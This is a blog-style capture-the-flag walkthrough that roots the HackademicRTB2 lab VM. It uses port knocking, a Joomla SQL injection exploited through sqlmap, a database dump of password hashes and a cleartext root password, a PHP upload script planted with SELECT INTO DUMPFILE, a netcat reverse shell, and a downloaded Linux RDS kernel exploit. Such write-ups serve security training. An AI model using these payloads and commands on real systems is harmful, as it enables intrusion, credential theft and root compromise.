---
title: HackademicRTB2 and the Art of Port Knocking
categories:
- CTF
---
After successful [rooting of HackademicRTB1](https://www.rcesecurity.com/index.php/2012/01/01/hackademicrtb1-challenge-solution/ "HackademicRTB1 challenge solution") which wasn't very hard at all, here's the second hackme, provided by [GhostInTheLab](http://ghostinthelab.wordpress.com/2011/09/06/hackademic-rtb2-%E2%80%93-root-this-box/), which is a bit more difficult as you will see. I've spent around 3 hours on solving this hackme, in comparison to HackademicRTB1 which took less than 1 hour to root.

The goal is to read the Key.txt in the root-directory. While working on this hackme I've encountered a nice technique called "Port Knocking", which is very interesting at all. So let's do not waste time.

Please notice: **If you want to solve this by yourself, stop reading here!**

After setting up a VM using VMware Workstation and running the downloaded Image, the first thing to do is: information gathering about the target. Nmap will help:

{% highlight bash %}
root@bt:~# nmap -T4 -A 192.168.0.24

Starting Nmap 5.61TEST2 ( http://nmap.org ) at 2012-01-11 22:28 CET
Scanning 192.168.0.24 [1 port]
Nmap scan report for 192.168.0.24
Host is up (0.00060s latency).
Not shown: 998 closed ports

PORT    STATE    SERVICE VERSION
80/tcp  open     http    Apache httpd 2.2.14 ((Ubuntu))
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Hackademic.RTB2
666/tcp filtered doom

MAC Address: 00:0C:29:AC:1D:04 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:kernel:2.6
OS details: Linux 2.6.17 - 2.6.36
Uptime guess: 0.015 days (since Wed Jan 11 22:06:39 2012)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=201 (Good luck!)
IP ID Sequence Generation: All zeros

Nmap done: 1 IP address (1 host up) scanned in 8.59 seconds
           Raw packets sent: 1020 (45.626KB) | Rcvd: 1016 (41.374KB)
{% endhighlight %}

Nmap shows two different open ports on the target: Port 80 running an Apache v2.2.14, and a filtered Port 666 which cannot be accessed at this point. Looks like you have to find a vulnerability within a web-application, instead of simply exploiting some faulty services.

Let's take a look at the webpage:

[![]({{ site.baseurl }}/assets/rtb2_1.png "rtb2_1")]({{ site.baseurl }}/assets/rtb2_1.png)

Looks ok so far. If you have a closer look at the webpage using a Nikto-scan:

{% highlight bash %}
root@bt:/pentest/web/nikto# ./nikto.pl -host 192.168.0.24
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          192.168.0.24
+ Target Hostname:    192.168.0.24
+ Target Port:        80
+ Start Time:         2012-01-11 22:33:36 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.2.14 (Ubuntu)
+ Retrieved x-powered-by header: PHP/5.3.2-1ubuntu4.7
+ Apache/2.2.14 appears to be outdated (current is at least Apache/2.2.19). Apache 1.3.42 (final release) and 2.0.64 are also current.
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-12184: /index.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
+ 6474 items checked: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2012-01-11 22:33:59 (GMT1) (23 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
{% endhighlight %}

There's a phpMyAdmin installed and some directories with listing enabled. Let's have a look at the phpMyAdmin installation and see if this basically could open a door to the entire system using the "phpmyadmin/changelog.php" file, which reveals that the installed version of phpMyAdmin is v3.3.2.0\. Searching on Exploit-DB for some exploits:

> phpMyAdmin 3.x Swekey Remote Code Injection Exploit

But that one isn't usable as you'll find out by launching against the target. So let's have a closer look at the entry-page. Start Burp Suite and set up a proxy for your favourite browser to see what's happening when trying to login:

{% highlight text %}
POST /check.php HTTP/1.1
Host: 192.168.0.24
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:9.0.1) Gecko/20100101 Firefox/9.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
DNT: 1
Proxy-Connection: keep-alive
Referer: http://192.168.0.24/
Content-Type: application/x-www-form-urlencoded
Content-Length: 48

username=admin&password=password&Submit=Check%21
{% endhighlight %}

Let's try to simply bypass the Login-Form using "admin" as a username and " ' OR 1=1--'" as a password. This seems to work, now we're transferred to a visually nearly blank, new page:

[![]({{ site.baseurl }}/assets/rtb2_2.png "rtb2_2")]({{ site.baseurl }}/assets/rtb2_2.png)

The page is scrollable and looks a bit too large. So check Burp again, what's going on here:

[![]({{ site.baseurl }}/assets/rtb2_3.png "rtb2_3")]({{ site.baseurl }}/assets/rtb2_3.png)

There's quite a long string hidden using the color "black" on a black background. Well...of course nobody would secure his website like this! This string looks a bit weird first, but if you have a closer look, you'll discover that this seems to be hex-encoded. Convert it to ASCII:

{% highlight text %}
3c 2d 2d 2d 2d 2d 2d 2d 2d 2d 3e 0d 0a 4b 6e 6f 63
6b 20 4b 6e 6f 63 6b 20 4b 6e 6f 63 6b 69 6e 27 20
6f 6e 20 68 65 61 76 65 6e 27 73 20 64 6f 6f 72 20
2e 2e 20 3a 29 0d 0a 30 30 31 31 30 30 30 31 20
30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30
30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 31
30 31 30 20 30 30 31 31 30 30 30 31 20 30 30 31
31 30 30 30 31 20 30 30 31 31 30 30 30 30 20 30
30 31 31 30 30 30 31 20 30 30 31 31 31 30 31 30
20 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30
30 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31
30 30 30 31 20 30 30 31 31 31 30 31 30 20 30 30
31 31 30 30 30 31 20 30 30 31 31 30 30 30 30 20
30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30
31 0d 0a 3c 2d 2d 2d 2d 2d 2d 2d 2d 2d 3e
{% endhighlight %}

Still looks a bit like a hex. Let's convert it to ASCII again and et voila:

{% highlight text %}
< - - - - - - - - - >

 K n o c k   K n o c k   K n o c k i n '   o n
 h e a v e n ' s   d o o r   . .   : )

0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 0
0 0 1 1 0 0 0 1   0 0 1 1 1 0 1 0   0 0 1 1 0 0 0 1
0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 1
0 0 1 1 1 0 1 0   0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 0
0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 1   0 0 1 1 1 0 1 0
0 0 1 1 0 0 0 1   0 0 1 1 0 0 0 0   0 0 1 1 0 0 0 0
0 0 1 1 0 0 0 1

 < - - - - - - - - - >
 {% endhighlight %}

This is a message, isn't it ?! By the way: Burp also has got a nice decoder integrated:

[![]({{ site.baseurl }}/assets/rtb2_4.png "rtb2_4")]({{ site.baseurl }}/assets/rtb2_4.png)

Right at this point I spent most of the time on this hackme, because I did not realize what the author wants to tell me :). Even after converting the binaries back to ASCII:

> 1001:1101:1011:1001

Uuhhm ?!?! I tried to google this sequence of bytes and ascii, I tried to use them as passwords for the phpMyAdmin - Page, I tried a lot of mathematical conversions with these bytes, but entirely I did not found anything which could help me :(

But after some desperate minutes of googling for the word "knock" in combination with "it security" the first result hit my eye: "port knocking". Sounds like a good way to protect something. And after thinking about the filtered port 666, it clearly came to my mind: maybe the admin has protected something on port 666 using "port knocking".

Wikipedia says about "Port knocking":

> In computer networking, port knocking is a method of externally opening ports on a firewall by generating a connection attempt on a set of prespecified closed ports. Once a correct sequence of connection attempts is received, the firewall rules are dynamically modified to allow the host which sent the connection attempts to connect over specific port(s). A variant called Single Packet Authorization exists, where only a single "knock" is needed, consisting of an encrypted packet.  
> The primary purpose of port knocking is to prevent an attacker from scanning a system for potentially exploitable services by doing a port scan, because unless the attacker sends the correct knock sequence, the protected ports will appear closed.

The found string "1001:1101:1011:1001" could be the sequence of ports you have to send a SYN to, to open the filtered port 666\. Let's give it a try using netcat:

{% highlight bash %}
netcat 192.168.0.24 1001
netcat 192.168.0.24 1101
netcat 192.168.0.24 1011
netcat 192.168.0.24 1001
{% endhighlight %}

after this sequence, let's do a portscan using nmap again:

{% highlight text %}
root@bt:~# nmap -T4 -A 192.168.0.24

Starting Nmap 5.61TEST4 ( http://nmap.org ) at 2012-01-11 23:19 CET
Nmap scan report for 192.168.0.24
Host is up (0.00071s latency).
Not shown: 998 closed ports

PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.2.14 ((Ubuntu))
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Hackademic.RTB2
666/tcp open  http    Apache httpd 2.2.14 ((Ubuntu))
| http-robots.txt: 14 disallowed entries
| /administrator/ /cache/ /components/ /images/
| /includes/ /installation/ /language/ /libraries/ /media/
|_/modules/ /plugins/ /templates/ /tmp/ /xmlrpc/
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Hackademic.RTB2

MAC Address: 00:0C:29:AC:1D:04 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:kernel:2.6
OS details: Linux 2.6.17 - 2.6.36
Network Distance: 1 hop

Nmap done: 1 IP address (1 host up) scanned in 19.69 seconds
{% endhighlight %}

Great! The port knocking worked like a charm. Port 666 has been opened running another Apache. Browse to it:

[![]({{ site.baseurl }}/assets/rtb2_5.png "rtb2_5")]({{ site.baseurl }}/assets/rtb2_5.png)

Port 666 is running a Joomla installation. Maybe there are some vulnerable modules to get deeper into the system ? Let's check that using the famous Joomla-vulnerability scanner "Joomscan":

{% highlight bash %}
root@bt:/pentest/web/scanners/joomscan# ./joomscan.pl -u 192.168.0.24
=================================================================

OWASP Joomla! Vulnerability Scanner v0.0.3-b
(c) Aung Khant, aungkhant]at[yehg.net
YGN Ethical Hacker Group, Myanmar, http://yehg.net/lab
Update by: Web-Center, http://web-center.si (2011)
=================================================================

Vulnerability Entries: 600
Last update: December 20, 2011

Use "update" option to update the database
Use "check" option to check the scanner update
Use "download" option to download the scanner latest version package
Use svn co to update the scanner
svn co https://joomscan.svn.sourceforge.net/svnroot/joomscan joomscan

Target: http://192.168.0.24

Server: Apache/2.2.14 (Ubuntu)
X-Powered-By: PHP/5.3.2-1ubuntu4.7

## NOTE: The Administrator URL was renamed. Bruteforce it. ##
## None of /administrator, /admin, /manage ##

## Checking if the target has deployed an Anti-Scanner measure

[!] Scanning Passed ..... OK

## Detecting Joomla! based Firewall ...

[!] .htaccess shipped with Joomla! is being deployed for SEO purpose
[!] It contains some defensive mod_rewrite rules
[!] Payloads that contain strings (mosConfig,base64_encode,<script>
GLOBALS,_REQUEST) wil be responsed with 403.

## Fingerprinting in progress ...

~Unable to detect the version. Is it sure a Joomla?

## Fingerprinting done.
{% endhighlight %}

The results from Joomscan are not usable at all because the admin has configured some defensive mod_rewrite rules, which results in a lot false/positives. The next part is going to be time-consuming if doing this by hand: You have to check every link on the site for a SQL-Injection. Another way is using a web-vulnerability-scanner like "WebSecurity". All in all there is a vulnerable parameter in the URL:

> http://192.168.0.24:666/index.php?option=com_abc&view=abc&letter=[SQLi]

[![]({{ site.baseurl }}/assets/rtb2_6.png "rtb2_6")]({{ site.baseurl }}/assets/rtb2_6.png)

Using sqlmap you can quickly verify the SQL-Injection vulnerability:

{% highlight bash %}
root@bt:/pentest/database/sqlmap# ./sqlmap.py --url "http://192.168.0.24:666/index.php?option=com_abc&view=abc&letter=" -p "letter"

    sqlmap/1.0-dev (r4550) - automatic SQL injection and database takeover tool
    http://www.sqlmap.org

[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 23:37:42

[23:37:42] [INFO] using '/pentest/database/sqlmap/output/192.168.0.24/session' as session file
[23:37:42] [INFO] testing connection to the target url
[23:37:42] [WARNING] provided parameter 'letter' is not inside the Cookie
[23:37:42] [INFO] testing if the url is stable, wait a few seconds
[23:37:43] [INFO] url is stable
[23:37:44] [INFO] heuristic test shows that GET parameter 'letter' might be injectable (possible DBMS: MySQL)
[23:37:44] [INFO] testing sql injection on GET parameter 'letter'
[23:37:44] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[23:37:44] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'
[23:37:45] [INFO] GET parameter 'letter' is 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause' injectable
[23:37:45] [INFO] testing 'MySQL > 5.0.11 stacked queries'
[23:37:45] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'
[23:37:45] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[23:37:45] [INFO] target url appears to be UNION injectable with 2 columns
[23:37:46] [INFO] GET parameter 'letter' is 'MySQL UNION query (NULL) - 1 to 10 columns' injectable
GET parameter 'letter' is vulnerable. Do you want to keep testing the others? [y/N]
sqlmap identified the following injection points with a total of 30 HTTP(s) requests:
---
Place: GET
Parameter: letter
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
    Payload: option=com_abc&view=abc&letter=' AND (SELECT 1689 FROM(SELECT COUNT(*),CONCAT(0x3a65716c3a,(SELECT (CASE WHEN (1689=1689) THEN 1 ELSE 0 END)),0x3a6562783a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'eyQe'='eyQe

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: option=com_abc&view=abc&letter=' UNION ALL SELECT NULL, CONCAT(0x3a65716c3a,0x464258564b54716b4c79,0x3a6562783a)# AND 'kdWK'='kdWK
---

[23:37:52] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 10.04 (Lucid Lynx)
web application technology: PHP 5.3.2, Apache 2.2.14
back-end DBMS: MySQL 5.0
{% endhighlight %}

Now you can enumerate the databases, using:

{% highlight bash %}
./sqlmap.py --url "http://192.168.0.24:666/index.php?option=com_abc&view=abc&letter=" -p "letter" --dbs
available databases [4]:
[*] information_schema
[*] joomla
[*] mysql
[*] phpmyadmin
{% endhighlight %}

The user running the queries:

{% highlight bash %}
./sqlmap.py --url "http://192.168.0.24:666/index.php?option=com_abc&view=abc&letter=" -p "letter" --current-user
[INFO] fetching current user
current user:    'root@localhost'
{% endhighlight %}

Well...this is the biggest mistake a web designer/coder/administrator can make: Running scripts using the root-user. This means we have full control over the whole MySQL-Database, resulting in fetching all MySQL-Users including their passwords:

{% highlight bash %}
./sqlmap.py --url "http://192.168.0.24:666/index.php?option=com_abc&view=abc&letter=" -p "letter" --users --passwords

database management system users password hashes:
[*] debian-sys-maint [1]:
    password hash: *F36E6519B0B1D62AA2D5346EFAD66D1CAF248996
[*] phpmyadmin [1]:
    password hash: *5D3C124406BF85494067182754131FF4DAB9C6C7
[*] root [1]:
    password hash: *5D3C124406BF85494067182754131FF4DAB9C6C7
    {% endhighlight %}

Or all Joomla-related user tables:

{% highlight bash %}
./sqlmap.py --url "http://192.168.0.24:666/index.php?option=com_abc&view=abc&letter=" -p "letter" -D "joomla" -T "jos_users" -C "name,password" --dump

Table: jos_users
[3 entries]
+---------------+-------------------------------------------------------------------+---------------+
| name          | password                                                          | username      |
+---------------+-------------------------------------------------------------------+---------------+
| Administrator | 08f43b7f40fb0d56f6a8fb0271ec4710:n9RMVci9nqTUog3GjVTNP7IuOrPayqAl | Administrator |
| John Smith    | 992396d7fc19fd76393f359cb294e300:70NFLkBrApLamH9VNGjlViJLlJsB60KF | JSmith        |
| Billy Tallor  | abe1ae513c16f2a021329cc109071705:FdOrWkL8oMGl1Tju0aT7ReFsOwIMKliy | BTallor       |
+---------------+-------------------------------------------------------------------+---------------+
{% endhighlight %}

Now you can either crack those password hashes, but this is probably the longest journey to your goal. Another simple way: The sitescript gets executed by the root-user. This means we have full control over the filesystem too! Using sqlmap's file-read function, you can easily grab the Joomla-Config file which contains the MySQL-User-Credentials  in plain text (by the way you can also read the "/root/Key.txt" the same way, but this is for the lazy ones! Instead I would like to have full shell-control!)

{% highlight bash %}
./sqlmap.py --url "http://192.168.0.24:666/index.php?option=com_abc&view=abc&letter=" -p "letter" --file-read=/var/www/configuration.php
{% endhighlight %}

[![]({{ site.baseurl }}/assets/rtb2_7.png "rtb2_7")]({{ site.baseurl }}/assets/rtb2_7.png)

In the "configuration.php" file, you can find the MySQL-credentials used for Joomla:

{% highlight text %}
/* Database Settings */
var $dbtype = 'mysql';
var $host = 'localhost';
var $user = 'root';
var $password = 'yUtJklM97W';
var $db = 'joomla';
var $dbprefix = 'jos_';
{% endhighlight %}

Using the found credentials we can now easily access the hosted phpMyAdmin:

[![]({{ site.baseurl }}/assets/rtb2_8.png "rtb2_8")]({{ site.baseurl }}/assets/rtb2_8.png)

Next step: Uploading a phpshell to get access to a /bin/bash:

Create a tempdb and one table called "form" with one column and insert the following code:

{% highlight html %}
<form enctype="multipart/form-data" action="upload.php" method="post">
<pre lang="html">Upload file :
<form enctype="multipart/form-data" action="upload.php" method="post">
<input name="userfile" type="file" /><input type="submit" value="Upload" />
</form>
{% endhighlight %}

dump this to the filesystem (obviously the www-directory, since we want to execute the shellscript):

{% highlight html %}
SELECT * INTO DUMPFILE '/var/www/form.php' from form;
{% endhighlight %}

create a second table called "upload"  with one column and insert:

{% highlight php %}
<?php
$uploaddir = "/var/www/";$uploadfile = $uploaddir . basename($_FILES["userfile"]["name"]);echo "<pre>";
if (move_uploaded_file($_FILES["userfile"]["tmp_name"], $uploadfile))print "</pre>";
?>
{% endhighlight %}

this small script, used by the upload-form moves the file to the correct directory. Dump it:

{% highlight html %}
SELECT * INTO DUMPFILE '/var/www/upload.php' from upload;
{% endhighlight %}

and brwose to the upload-form:

[![]({{ site.baseurl }}/assets/rtb2_9.png "rtb2_9")]({{ site.baseurl }}/assets/rtb2_9.png)

Now you can upload heavy shell-scripts like C99 or R57, but our minimalistic php-reverse-shell-script from the [HackademicRTB1 solution](https://www.rcesecurity.com/index.php/2012/01/01/hackademicrtb1-challenge-solution/ "HackademicRTB1 challenge solution") is quite enough again. Configure a netcat to listen for  incoming (reversed) connections:

{% highlight bash %}
root@bt:~/Desktop# nc -l -n -v -p 1337
listening on [any] 1337 ...
{% endhighlight %}

Upload the php-reverse-shell and launch using your browser and et voila:

{% highlight bash %}
connect to [192.168.0.27] from (UNKNOWN) [192.168.0.24] 45168
Linux HackademicRTB2 2.6.32-24-generic #39-Ubuntu SMP Wed Jul 28 06:07:29 UTC 2010 i686 GNU/Linux
 01:29:02 up  2:27,  0 users,  load average: 0.00, 0.00, 0.01
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
{% endhighlight %}

Apache is run by the user "www-data" who has not enough system-rights to read contents inside the /root/ directory. So again, we're using the

> Linux Kernel <= 2.6.36-rc8 RDS privilege escalation exploit
> 
> The rds_page_copy_user function in net/rds/page.c in the Reliable Datagram Sockets (RDS)  
> protocol implementation in the Linux kernel before 2.6.36 does not properly validate  
> addresses obtained from user space, which allows local users to gain privileges  
> via crafted use of the sendmsg and recvmsg system calls.

to exploit the kernel and get root-privileges:

Download and compile the exploit:

{% highlight bash %}
$ cd /tmp
$ wget http://www.vsecurity.com/download/tools/linux-rds-exploit.c
--2012-01-12 01:30:54--  http://www.vsecurity.com/download/tools/linux-rds-exploit.c
Resolving www.vsecurity.com... 209.67.252.12
Connecting to www.vsecurity.com|209.67.252.12|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6435 (6.3K)

2012-01-12 01:30:54 (58.7 KB/s) - `linux-rds-exploit.c' saved [6435/6435]

$ gcc linux-rds-exploit.c -o rds
{% endhighlight %}

and launch it:

{% highlight bash %}
$ ./rds
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved rds_proto_ops to 0xe0ab9980
 [+] Resolved rds_ioctl to 0xe0ab3090
 [+] Resolved commit_creds to 0xc016dd80
 [+] Resolved prepare_kernel_cred to 0xc016e0c0
[*] Overwriting function pointer...
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved rds_proto_ops to 0xe0ab9980
 [+] Resolved rds_ioctl to 0xe0ab3090
 [+] Resolved commit_creds to 0xc016dd80
 [+] Resolved prepare_kernel_cred to 0xc016e0c0
[*] Overwriting function pointer...
[*] Triggering payload...
[*] Restoring function pointer...
{% endhighlight %}

and finally:

{% highlight bash %}
id
uid=0(root) gid=0(root)

ls -l /root
total 40
drwxr-xr-x 2 root root  4096 Jan 17  2011 Desktop
-rwxr-xr-x 1 root root 33921 Jan 22  2011 Key.txt
{% endhighlight %}

Now we are able to read the contents of the "Key.txt":

{% highlight text %}
cat /root/Key.txt
iVBORw0KGgoAAAANSUhEUgAAAvQAAAFYCAIAAACziP9JAAAACXBIWXMAAAsTAAALEwEAmpwYAAAg
AElEQVR4nOy9eZhdVZXw/bu35iFVlXmgUiQhBAIJEGKMAQGDb1rpbj5EjYK8KIoy+SniIyC2Q4uC
Nn5tOzI4dAvaKI2CLTgEWmYIGTCBQAbIUEkqVZWa5+lO3x/nXefdt4Y71D3DvbfW78nDk1C3zll3
n332XnuNoCiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiK
[...stripped...]
EhKimNxkZmbqHSYAAIBq7e3t4uQmJiZG7xgBAABUq6ioECc34hmKAcD7sfwCYC7iITVnz57t7u6W
FgwAAIAbCG7bxMfH6x0dAADAEMXFxQ2a2SxcuFDv0AAAADQJCgoqLi7uS2tKS0uTkpL0DgoAAMA1
QUFBycnJYWFhegcCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAACg0f8BeD+YFbp5dlYAAAAASUVORK5CYII=
{% endhighlight %}

But hold on! That looks weird and not human-readable. At the end of the string you recognize the "=" which indicates that it's probably base64 encoded. There are different ways of decrypting this, the easiest for now is using burp-suite. Move the file to a webserver directory:

{% highlight bash %}
chmod 777 Key.txt

cp Key.txt /var/www
{% endhighlight %}

Browse it using burp:

[![]({{ site.baseurl }}/assets/rtb2_10.png "rtb2_10")]({{ site.baseurl }}/assets/rtb2_10.png)

And if you have a look at the decoded values, you've probably recognized the "PNG" string which indicates that this is an image file. Save and view it :-):

[![]({{ site.baseurl }}/assets/rtb2_11.png "rtb2_11")]({{ site.baseurl }}/assets/rtb2_11.png)

Done! Compromised, decrypted, leaked :) !
